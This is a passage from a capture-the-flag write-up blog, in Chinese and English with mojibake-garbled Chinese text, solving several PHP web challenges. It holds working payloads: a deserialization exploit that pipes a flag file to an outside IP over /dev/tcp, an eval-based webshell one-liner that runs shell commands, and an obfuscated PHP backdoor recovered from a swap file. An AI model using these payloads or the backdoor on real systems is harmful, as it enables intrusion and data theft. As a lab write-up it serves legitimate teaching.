class="comment">//6 7 6 4  c  d  f 9  f 2 7  3 2 f 2  f  2  3  b 7 5 2  b f f  7 6  c 9  0  1 7 </span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure>
<p>éšä¾¿ä¼ å…¥ä»€ä¹ˆä¸œè¥¿ï¼Œæ³¨æ„hashçš„å†’å·åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ä¸è¦å¿½è§†ã€‚<br>
å¼¹å‡ºæ¥çš„hintæ‹¿æ¥åˆ†æã€‚<br>
æ ¹æ®æˆ‘å†™çš„æ³¨é‡Šï¼Œç»“åˆäºŒè¿›åˆ¶çš„ä¸è¿ç®—ï¼Œæˆ‘ä»¬åªèƒ½çŸ¥é“é›¶ä½ä»£è¡¨æ•°å­—ï¼Œ64ä»£è¡¨å­—æ¯ã€‚</p>
<p>æ³¨æ„åˆ°<code>if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {</code>æ˜¯å¼±ç±»å‹æ¯”è¾ƒã€‚</p>
<p>å‚è€ƒå°è¥¿å¸ˆå‚…çš„åšå®¢ï¼ŒçŸ¥é“äº†å¤´ä¸‰ä½æ˜¯æ•°å­—ï¼Œé‚£ä¹ˆåªè¦çˆ†ç ´å¤´ä¸‰ä½å°±å¯ä»¥äº†ã€‚</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /admin/login.php HTTP/1.1</span><br><span class="line">Host: gameserver.zajebistyc.tf</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __cfduid=df075e1e270efb9af840cfbcfcea51b6b1552736385;otadmin=&#123;&quot;hash&quot;: Â§111Â§&#125;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
<p>ç„¶åä¸ºpayloadè®¾ç½®numberç±»å‹ï¼Œèµ·ç‚¹100ç»ˆç‚¹999æ­¥é•¿ä¸º1ï¼Œè·‘ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œæœ€ç»ˆflag:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p4&#123;wtf_php_comparisons_how_do_they_work&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2019-RCTF-nextphp">2019 RCTF nextphp</h2>
<p>After <code>phpinfo()</code>, we can notice the versionn is <code>php 7.4</code> ,and a new feature <code>ffi</code> was enabled .</p>
<blockquote>
<p>FFI is one of the features that made Python and LuaJIT very useful for<br>
fast prototyping. It allows calling C functions and using C data types<br>
from pure scripting language and therefore develop â€œsystem codeâ€ more<br>
productively. For PHP, FFI opens a way to write PHP extensions and<br>
bindings to C libraries in pure PHP.</p>
</blockquote>
<p><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi</a> alse give an example:</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &lt;?php</span><br><span class="line">&gt; // create FFI object, loading libc and exporting function printf()</span><br><span class="line">&gt; $ffi = FFI::cdef(</span><br><span class="line">&gt;     &quot;int printf(const char *format, ...);&quot;, // this is regular C declaration</span><br><span class="line">&gt;     &quot;libc.so.6&quot;);</span><br><span class="line">&gt; // call C printf()</span><br><span class="line">&gt; $ffi-&gt;printf(&quot;Hello %s!\n&quot;, &quot;world&quot;);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>And using <code>var_dump()</code> , we got source code as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mix the two array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unserialize the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return the ith data in $data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __set ($key, $value) &#123;</span></span><br><span class="line">        <span class="comment">// throw new \Exception('No implemented');</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __construct () &#123;</span></span><br><span class="line">        <span class="comment">// throw new \Exception('No implemented');</span></span><br><span class="line">    <span class="comment">/* &#125; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>generate serialized string and sent it to target as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a=unserialize(&apos;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&apos;);$a-&gt;ret-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/207.148.64.125/9991&quot;&apos;);</span><br></pre></td></tr></table></figure>
<h2 id="ichunqiu-Hash">ichunqiu Hash</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'Gu3ss_m3_h2h2.php'</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">"Gu3ss_m3_h2h2.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>__wakeup</code> function will be called automatically when <strong>unserialize happen</strong> .In order to bypass the limitation, first , replace <code>O:4:</code> to <code>O:+4:</code> to bypass Regular expression. Second, <strong>increase the number of parameter in serialize string</strong> to bypass <code>__wakeup</code> function (keep silient when the parameter number is wrong).</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'f15g_1s_here.php'</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Demo();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">$a = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>, $a);</span><br><span class="line">$a = str_replace(<span class="string">':1:'</span>,<span class="string">':2:'</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>
<p>And there is a trap which is noteable enough,  the serialized string that be eched in our payload shows as follow:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>See something strange? **â€œDemofileâ€ has 8 character , but it shows there are 10 characters , which, indicates that it contains some Invisible characters . It was the reason why copy the echod string directly and got it in base64-encode did not word. **</p>
<p>and <code>f15g_1s_here.php</code> â€™ s contents are as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'val'</span>])) &#123;</span><br><span class="line">    $val = $_GET[<span class="string">'val'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'$value="'</span> . addslashes($val) . <span class="string">'";'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hahaha!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?val=$&#123;@eval($_POST[0])&#125;</span><br><span class="line">Post data: 0=phpinfo();</span><br><span class="line">0=echo `ls`</span><br><span class="line">0=echo `cat True_F1ag_i3_Here_233.php`</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps: <strong>`</strong> actully call shell_exec() function</p>
</blockquote>
<h2 id="ichunqiu-try">ichunqiu try</h2>
<p>finally got source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_GET[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_POST[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_COOKIE[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]==<span class="string">'yes'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'not admin'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>and our payload is :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/Get_Fl3g_e165421110ba03099a1c0393373c5b43.php?_SERVER[_SESSION][admin]=yes</span><br></pre></td></tr></table></figure>
<p>so , from the payload above , there is one thing to be true: <strong>when $_GET as $key =&gt; $value was executed , the variable $_SERVER has already generated.</strong></p>
<h2 id="login">login</h2>
<p>çœ‹æºç æ‹‰åˆ°ä¸‹é¢æœ‰å¯†ç ï¼Œç™»é™†æŠ“åŒ…ï¼Œçœ‹è§æœ‰ä¸ªå‚æ•°<code>show</code>ï¼Œç„¶åä¿®æ”¹ä»–çš„å€¼ä»0å˜æˆ1ï¼Œå‘é€ï¼Œå¾—åˆ°æºä»£ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include &apos;common.php&apos;;</span><br><span class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	class db</span><br><span class="line">	&#123;</span><br><span class="line">		public $where;</span><br><span class="line">		function __wakeup()</span><br><span class="line">		&#123;</span><br><span class="line">			if(!empty($this-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				$this-&gt;select($this-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		function select($where)</span><br><span class="line">		&#123;</span><br><span class="line">			$sql = mysql_query(&apos;select * from user where &apos;.$where);</span><br><span class="line">			return @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($requset[&apos;token&apos;]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));</span><br><span class="line">		$db = new db();</span><br><span class="line">		$row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;);</span><br><span class="line">		if($login[&apos;user&apos;] === &apos;ichunqiu&apos;)</span><br><span class="line">		&#123;</span><br><span class="line">			echo $flag;</span><br><span class="line">		&#125;else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;])&#123;</span><br><span class="line">			echo &apos;unserialize injection!!&apos;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ &quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		header(&apos;Location: index.php?error=1&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>å‘é€çš„ä¸œè¥¿å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;);</span><br><span class="line">echo base64_encode(gzcompress(serialize($a)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ åˆ°è¯·æ±‚å¤´cookieä¸­çš„tokenä¸­å‘é€å¾—åˆ°flag</p>
<h2 id="backdoor-ichunqiu">backdoor (ichunqiu)</h2>
<p>é¦–å…ˆæ ¹æ®é¢˜ç›®æç¤ºï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè®¿é—®<code>flag.php</code>æ— æœï¼Œç„¶ååˆ†åˆ«ç”¨<code>7kbscan</code>å’Œ<code>ç‹ä¸€èˆª</code>çš„è„šæœ¬å»æ‰«æï¼Œå‘ç°æœ‰<code>.git</code>æ–‡ä»¶æ³„éœ²ï¼Œä½†æ˜¯ç‹çš„è„šæœ¬æ˜¾ç¤ºè®¿é—®.gitçš„æ—¶å€™æ˜¾ç¤º<code>403</code>ï¼Œæ„å‘³ç€æ–‡ä»¶å­˜åœ¨ä½†æ˜¯æ‹’ç»è®¿é—®ï¼Œä½†æ˜¯å…¶ä»–.gitæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶æ˜¾ç¤º200å¯ä»¥è®¿é—®ã€‚</p>
<p>å› æ­¤å¯ä»¥ä½¿ç”¨<code>dvcs-ripper</code>æ¥è·å–<code>.git</code>æ–‡ä»¶ï¼Œè¿™ä¸ªå·¥å…·å’Œ<code>githack</code>çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå‰è€…é™¤äº†ä¸‹è½½æ–‡ä»¶ä¹‹å¤–è¿˜èƒ½å›æ»šå›å»ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œè€Œåè€…å´ä¸èƒ½ã€‚ä½¿ç”¨ç”¨æ³•çœ‹çœ‹<code>readme.md</code>å°±çŸ¥é“å•¦ã€‚</p>
<p>ä¸‹è½½å®Œä¹‹åå…¶ä¸­æœ‰ä¸€ä¸ª<code>flag.php</code>ï¼Œç„¶åä½¿ç”¨<code>git log flag.php</code>æ¥çœ‹è¿™ä¸ªæ–‡ä»¶çš„å†å²ç‰ˆæœ¬ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">commit da06087a0b893ddb6b6c857e53ce4387c96785ab           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:13:16 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:09:53 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    test                                                  </span><br><span class="line">                                                          </span><br><span class="line">commit 494a75f8b3c397e8da52e3ff82ddc4bf1bc47f17           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:07:47 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">:...skipping...                                           </span><br><span class="line">commit da06087a0b893ddb6b6c857e53ce4387c96785ab           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:13:16 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:09:53 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    test                                                  </span><br><span class="line">                                                          </span><br><span class="line">commit 494a75f8b3c397e8da52e3ff82ddc4bf1bc47f17           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:07:47 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 1556a1d651526780ecd22db22681619e4ce6aa4b           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:58:51 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 734d08bfd094afa3372b997bf1c71412c1afc7d9           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:58:44 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 25a4a898b1a45412a538a7baa868bc406c1d8ba9           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:55:18 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    added web app</span><br></pre></td></tr></table></figure>
<p>ç„¶åä½¿ç”¨å‘½ä»¤<code>git diff 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88</code>æ¥æŸ¥çœ‹ä¹‹å‰ä¸€ä¸ªç‰ˆæœ¬çš„æ–‡ä»¶ã€‚å‘ç°<code>flag{true_flag_is_in_the_b4cko0r.php}</code>ã€‚</p>
<p>ç„¶åå°è¯•è®¿é—®<code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/b4ckdo0r.php</code>ï¼Œé¡µé¢æç¤ºè¦æˆ‘ä»¬å»æ‰¾æºç ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å°è¯•</p>
<p><code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/.b4ckdo0r.php.swp</code><br>
å’Œ<code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/.b4ckdo0r.php.swo</code>æ¥çœ‹çœ‹æ˜¯å¦æœ‰æ–‡ä»¶å¤‡ä»½ã€‚å‘ç°swoå¯ä»¥ã€‚</p>
<p>ä¸‹è½½ä¸‹æ¥ä¹‹åä½¿ç”¨å‘½ä»¤<code>vim -r b4ckdo0r.php.swo</code>æ¥è¿˜åŸï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;can you find the source code of me?&quot;;</span><br><span class="line">/**</span><br><span class="line"> * Signature For Report</span><br><span class="line"> */$h=&apos;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&apos;;/*</span><br><span class="line"> */$H=&apos;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&apos;;/*</span><br><span class="line"> */$N=&apos;mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p&apos;;/*</span><br><span class="line"> */$u=&apos;$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&apos;;/*</span><br><span class="line"> */$f=&apos;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)&apos;;/*</span><br><span class="line"> */$O=&apos;[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&apos;;/*</span><br><span class="line"> */$w=&apos;)m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m&apos;;/*</span><br><span class="line"> */$P=&apos;trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3&apos;;/*</span><br><span class="line"> */$i=&apos;)marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&apos;;/*</span><br><span class="line"> */$x=&apos;m([\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m&apos;;/*</span><br><span class="line"> */$y=str_replace(&apos;b&apos;,&apos;&apos;,&apos;crbebbabte_funcbbtion&apos;);/*</span><br><span class="line"> */$c=&apos;$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;&apos;;</span><br><span class="line"></span><br><span class="line">echo $c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H;/*</span><br><span class="line"> *///$L=str_replace(&apos;)m&apos;,&apos;&apos;,$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/*</span><br><span class="line"> //*///$v=$y(&apos;&apos;,$L);$v();/*</span><br><span class="line"> //*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
